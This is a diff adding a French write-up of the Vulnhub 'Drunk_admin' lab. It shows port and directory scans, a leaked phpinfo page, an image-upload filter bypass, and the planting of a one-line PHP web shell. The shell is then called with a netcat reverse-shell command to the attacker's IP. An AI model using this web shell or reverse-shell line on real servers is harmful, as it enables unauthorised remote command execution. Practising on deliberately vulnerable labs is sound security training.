@@ -1,0 +1,150 @@
+Vulnhub :
+Drunk_admin 
+=================================
+Attack IP : 10.0.1.103
+Victim IP : 10.0.1.100
+=================================
+
+On commence comme d'habitude un nmap, amap, unicornscan, etc.
+Un petit script pas mal de : http://blog.techorganic.com/2012/05/31/port-scanning-one-two-punch/
+root@DebSec:~/Git/onetwopunch# ./onetwopunch.sh -t targets.txt -p tcp -i eth0 -n -A
+                             _                                          _       _ 
+  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
+ / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
+| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/ 
+ \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/   
+                                                |_|                               
+                                                                   by superkojiman
+
+[+] Protocol : tcp
+[+] Interface: eth0
+[+] Nmap opts: -A
+[+] Targets  : targets.txt
+[+] Scanning 10.0.1.100 for tcp ports...
+[+] Obtaining all open TCP ports using unicornscan...
+[+] unicornscan -i eth0 -mT 10.0.1.100:a -l /root/.onetwopunch/udir/10.0.1.100-tcp.txt
+[*] TCP ports for nmap to scan: 22,8880,
+[+] nmap -e eth0 -A -oX /root/.onetwopunch/ndir/10.0.1.100-tcp.xml -oG /root/.onetwopunch/ndir/10.0.1.100-tcp.grep -p 22,8880, 10.0.1.100
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-26 21:14 CET
+Nmap scan report for 10.0.1.100
+Host is up (0.0069s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:a2:04:3d:6e:e5:01:7b:b4:c6:e5:f9:76:25:8a:8a (DSA)
+|_  2048 66:9a:ee:a2:2a:1a:59:47:b9:c5:50:da:a6:96:76:16 (RSA)
+8880/tcp open  http    Apache httpd 2.2.16 ((Debian))
+|_http-server-header: Apache/2.2.16 (Debian)
+|_http-title: Tripios
+MAC Address: 00:0C:29:77:ED:01 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.26 - 2.6.35, Linux 2.6.32
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   6.91 ms 10.0.1.100
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
+[+] Scans completed
+[+] Results saved to /root/.onetwopunch
+
+==================================================
+Donc résultat des infos deux ports ouverts, le type d'OS et sa version :
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:a2:04:3d:6e:e5:01:7b:b4:c6:e5:f9:76:25:8a:8a (DSA)
+|_  2048 66:9a:ee:a2:2a:1a:59:47:b9:c5:50:da:a6:96:76:16 (RSA)
+8880/tcp open  http    Apache httpd 2.2.16 ((Debian))
+|_http-server-header: Apache/2.2.16 (Debian)
+|_http-title: Tripios
+MAC Address: 00:0C:29:77:ED:01 (VMware)
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.26 - 2.6.35, Linux 2.6.32
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+===================================================
+Du HTTP, donc on va partir sur les basics : recherche de répertoires, des informations non protégées correctement, etc.
+Durant la phase de découverte, on lance un petit dirb pour voir si il n'y a pas de répertoires interressant.
+dirb http://10.0.1.100:8880/ -w SecLists/Discovery/Web_Content/raft-large-directories.txt
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Nov 26 21:33:03 2017
+URL_BASE: http://10.0.1.100:8880/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.1.100:8880/ ----
++ http://10.0.1.100:8880/cgi-bin/ (CODE:403|SIZE:288)                                                                                                
++ http://10.0.1.100:8880/image (CODE:200|SIZE:1392)                                                                                                  
+==> DIRECTORY: http://10.0.1.100:8880/images/                                                                                                        
++ http://10.0.1.100:8880/index (CODE:200|SIZE:1638)                                                                                                  
++ http://10.0.1.100:8880/index.php (CODE:200|SIZE:1638)                                                                                              
++ http://10.0.1.100:8880/info (CODE:200|SIZE:1600)                                                                                                   
++ http://10.0.1.100:8880/info.php (CODE:200|SIZE:1600)                                                                                               
++ http://10.0.1.100:8880/server-status (CODE:403|SIZE:51)                                                                                            
+==> DIRECTORY: http://10.0.1.100:8880/style/                                                                                                         
++ http://10.0.1.100:8880/upload (CODE:200|SIZE:57)                                                                                                   
+
+Les seules pages qui répondent sont : index.php, upload, image, le reste "rabbit hole".                                                           
+Dans la série des fausses pistes pas de fichier : robots.txt, pour nous donnner d'autres informations
+
+Un truc interressant lorsqu'on clique sur les liens en bas de la page on tombe sur :
+- validation : W3C, aucun interet
+- validation : jigsaw pour les CSS, ne marche pas
+- et puis un lien php qui nous mène à une page interressante :
+http://10.0.1.100:8880/myphp.php?id=102
+On va voir sur ce que l'on peut récolter ici : http://php.net/manual/fr/function.phpinfo.php
+donc on additionne ou sosutrait, le phinfo normal s'affiche avec 102,avec 100-1 : on absolument toute les informations.
+si on clique sur le lien on a une espèce de phpinfo.
+on teste des choses :
+http://10.0.1.100:8880/myphp.php?id=103 mais aussi 104 et finalement 100 ou 99 (complet !!).
+Pas mal d'informations importantes dont celle des fonctions_disable. Les fonctions désactivées :
+disable_functions system, passthru, popen, proc_open, pcntl_exec, shell_exec, fsockopen, python_eval, perl->system
+l'utilisateur utilisé pour les scripts (www-data(33)/33), la racine du serveur web (/var/www), le path des logs (/var/log/apache2).
+
+===================================================
+On attaque, donc à l'attaque :
+On lance Burp, on modifi Firefox, on proxyfie nos requêtes.
+Sur la page HTTP via le port 8880 on arrive sur un site/blog permettant d'uploader des images :
+On teste plusieurs choses, plusieurs type d'images :
+du .gif, du .jpeg, du .png. Donc normal on va tester avec du .php, pour uploader un webshell.
+Nous nous apercevons très rapidement qu'il y a un filtre pour le suffixe des images (fichiers) uploader.
+Autre info le dossier de destination  est /images suivi d'un hash et du suffixe de l'image :
+exemple :
+http://10.0.1.100:8880/images/cd0afdcdc1366eddfa29e9b211628eb3
+
+
+
+<?php
+ echo exec($_REQUEST['cmd']);
+?>
+
+http://10.0.1.100:8880/images/cd0afdcdc1366eddfa29e9b211628eb3?cmd=nc%20-c%20/bin/sh%2010.0.1.103%20443
+
+https://www.charlesproxy.com/overview/
+
+
+http://10.0.1.100:8880/~bob/
+
+echo 'TGglMUxecjJDSDclN1Ej'|base64 -d
+Lh%1L^r2CH7%7Q#
+
+Alice, prepare for a kinky night. Meet me at '35.517286' '24.017637'
